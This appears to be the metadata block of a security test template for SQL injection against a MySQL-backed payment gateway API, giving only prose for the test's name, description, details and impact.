  name: "SQL Injection test on Payment Gateway API for MySQL"
  description: > 
    "SQL Injection testing on a Payment Gateway API for MySQL involves assessing vulnerabilities in the API's handling and processing of SQL queries. Attackers exploit these vulnerabilities by injecting malicious SQL commands through API parameters, aiming to compromise the MySQL database behind the payment gateway. This test ensures the security of sensitive financial transactions by identifying and mitigating potential SQL injection risks in the API implementation."
  details: >
    "SQL Injection testing on a Payment Gateway API for MySQL focuses on identifying and exploiting vulnerabilities in the API's input validation and SQL query handling mechanisms. Attackers attempt to inject SQL commands through API parameters, potentially gaining unauthorized access to sensitive payment information stored in the MySQL database. Mitigating these vulnerabilities is crucial to ensuring the integrity and security of financial transactions processed through the payment gateway."
  impact: >
    "The impact of SQL Injection on a Payment Gateway API for MySQL can be devastating, compromising the confidentiality and integrity of financial data. Successful exploitation could lead to unauthorized access to sensitive payment information, including credit card details and transaction records, stored in the MySQL database. This can result in financial losses, fraudulent transactions, damage to customer trust, and regulatory penalties, highlighting the critical need for robust security measures and regular vulnerability assessments in payment processing systems."
